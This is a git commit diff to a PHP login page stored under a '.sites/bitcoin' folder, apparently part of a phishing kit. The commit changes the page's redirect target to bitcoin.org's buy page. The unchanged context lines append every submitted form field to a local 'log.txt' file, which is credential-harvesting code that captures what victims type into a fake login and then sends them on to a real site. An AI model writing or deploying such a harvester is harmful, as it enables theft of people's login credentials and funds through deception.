10bfd9b9d92bb8aa866946ab3a1c39e2d6732e6f
render <fehrenbacherb07@gmail.com>
2025-11-10 12:29:01 -0600

    Update login.php

--- .sites/bitcoin/login.php
+++ .sites/bitcoin/login.php
@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://www.google.com');
+header ('Location: https://bitcoin.org/en/buy');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
